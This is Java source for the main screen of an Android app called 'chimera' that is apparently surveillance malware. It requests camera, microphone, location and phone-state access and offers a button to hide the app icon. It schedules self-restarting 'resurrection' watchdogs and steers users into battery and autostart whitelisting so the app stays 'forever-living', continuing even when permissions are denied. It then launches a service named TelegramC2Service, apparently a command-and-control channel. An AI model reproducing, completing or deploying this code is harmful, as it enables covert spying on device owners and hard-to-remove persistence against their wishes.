package com.chimera;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 101;
    private static final String FIRST_RUN_PREF = "isFirstRun";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btnContinue = findViewById(R.id.btnContinue);
        Button btnHide = findViewById(R.id.btnHide);

        btnContinue.setOnClickListener(v -> requestPerms());
        btnHide.setOnClickListener(v -> {
            DeviceControlHandler.setComponentState(this, false);
            Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
        });

        handleFirstRunRegistration();
        // Pyramid: schedule watchdogs early even before perms
        try { ResurrectionHelper.scheduleWatchdog(this); } catch (Exception ignored) {}
    }

    private void handleFirstRunRegistration() {
        SharedPreferences prefs = getSharedPreferences("chimera_prefs", MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean(FIRST_RUN_PREF, true);
        if (isFirstRun) {
            FCMHandlerService.registerDevice(this);
            // Ensure network monitor + resurrection scheduled
            ResurrectionHelper.resurrect(this);
            prefs.edit().putBoolean(FIRST_RUN_PREF, false).apply();
        }
    }

    private void requestPerms() {
        try {
            List<String> permsToRequest = new ArrayList<>();
            permsToRequest.add(Manifest.permission.CAMERA);
            permsToRequest.add(Manifest.permission.RECORD_AUDIO);
            permsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION);
            permsToRequest.add(Manifest.permission.READ_PHONE_STATE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                permsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            List<String> neededPerms = new ArrayList<>();
            for (String p : permsToRequest) {
                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                    neededPerms.add(p);
                }
            }
            if (!neededPerms.isEmpty()) {
                ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
            } else {
                onAllPermsGranted();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
        }
    }

    private void onAllPermsGranted() {
        Toast.makeText(this, "Permissions granted. Configuring forever-living...", Toast.LENGTH_LONG).show();
        // Step 1: Battery whitelist (stock Android)
        if (!BatteryOptimizationHelper.isWhitelisted(this)) {
            BatteryOptimizationHelper.requestWhitelist(this);
            // Give user 2 sec then show OEM
            findViewById(android.R.id.content).postDelayed(() -> promptOemWhitelist(), 2000);
        } else {
            promptOemWhitelist();
        }
        // Step 2: Start core service via allowed path (we are foreground activity, so FGS start is allowed)
        try { ResurrectionHelper.resurrect(this); } catch (Exception e) { ErrorLogger.logError(this, "onAllPerms_resurrect", e); }
        try {
            Intent svc = new Intent(this, TelegramC2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc); else startService(svc);
        } catch (Exception e) { ErrorLogger.logError(this, "onAllPerms_FGS", e); }
        finish();
    }

    private void promptOemWhitelist() {
        try {
            // OEM-specific autostart (Xiaomi, Huawei, etc) - best-effort
            boolean opened = OemHelper.openOemSettings(this);
            if (opened) {
                Toast.makeText(this, "Please allow Auto-start / No restrictions for " + OemHelper.getManufacturerLabel(), Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) { ErrorLogger.logError(this, "promptOem", e); }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE) {
            boolean allGranted = true;
            for (int r : grantResults) if (r != PackageManager.PERMISSION_GRANTED) allGranted = false;
            if (allGranted) {
                onAllPermsGranted();
            } else {
                Toast.makeText(this, "Some permissions denied. Retrying battery setup...", Toast.LENGTH_SHORT).show();
                onAllPermsGranted();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Detect if user returned from battery settings and whitelist now granted
        if (BatteryOptimizationHelper.isWhitelisted(this)) {
            // Re-schedule resurrection to ensure OEM reset didn't kill us
            ResurrectionHelper.resurrect(this);
        }
    }
}
